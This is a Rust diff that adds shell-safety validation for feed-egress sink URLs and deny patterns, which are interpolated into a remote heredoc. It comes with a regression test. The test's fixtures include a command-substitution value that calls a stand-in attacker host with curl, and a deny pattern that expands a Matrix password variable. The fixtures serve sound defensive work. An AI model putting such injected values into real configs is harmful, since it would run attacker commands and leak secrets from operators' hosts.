@@ -436,6 +436,20 @@ pub fn preflight(config: &AddWorkerConfig) -> Result<Secrets> {
     if config.feed_egress_enabled && config.feed_egress_ingest_key_file.is_none() {
         bail!("--feed-egress requires --feed-egress-ingest-key-file");
     }
+    // `feed_egress_sink_url` and `feed_egress_deny_patterns` are interpolated
+    // into the same unquoted heredoc as `homeserver`/`room` in
+    // `render_safehouse_config` — so, like those fields, they must be
+    // shell-safe before they are ever rendered. Without this, an
+    // operator-supplied deny-pattern or sink URL containing `$` or backticks
+    // could have the remote shell expand it against the secrets already
+    // exported into that shell (`SAFEHOUSE_MATRIX_PASSWORD`,
+    // `FLEET_FEED_INGEST_KEY`, ...) or execute arbitrary commands.
+    if config.feed_egress_enabled {
+        validate_safe_token("feed-egress-sink-url", &config.feed_egress_sink_url, ".:/_-?=&")?;
+        for pattern in &config.feed_egress_deny_patterns {
+            validate_safe_token("feed-egress-deny-pattern", pattern, ".:/_-?=&")?;
+        }
+    }
 
     if let Some(path) = &config.safehouse_tailnet_auth_key_file {
         let contents = std::fs::read_to_string(path).with_context(|| {
@@ -2852,6 +2866,28 @@ exit 0
         let mut config = feed_egress_config_with_real_secret_files(dir.path());
         config.feed_egress_ingest_key_file = Some(key_file);
         assert!(preflight(&config).is_err());
+    }
+
+    /// `feed_egress_sink_url` and `feed_egress_deny_patterns` are
+    /// interpolated into the same unquoted heredoc as `homeserver`/`room`
+    /// (`render_safehouse_config`) after the safehouse Matrix secrets have
+    /// already been exported into that shell — an unvalidated `$` or
+    /// backtick in either would let an operator-supplied value expand a
+    /// sourced secret, or execute a command, into the written config file.
+    /// Mirrors `preflight_rejects_unsafe_homeserver_url_and_room` for these
+    /// two newer fields.
+    #[test]
+    fn preflight_rejects_unsafe_feed_egress_sink_url_and_deny_pattern() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut config = feed_egress_config_with_real_secret_files(dir.path());
+        config.feed_egress_sink_url = "https://evil/$(curl attacker.example/x)".to_string();
+        let err = preflight(&config).unwrap_err().to_string();
+        assert!(err.contains("feed-egress-sink-url"), "err: {err}");
+
+        let mut config2 = feed_egress_config_with_real_secret_files(dir.path());
+        config2.feed_egress_deny_patterns = vec!["$SAFEHOUSE_MATRIX_PASSWORD".to_string()];
+        let err2 = preflight(&config2).unwrap_err().to_string();
+        assert!(err2.contains("feed-egress-deny-pattern"), "err: {err2}");
     }
 
     #[test]
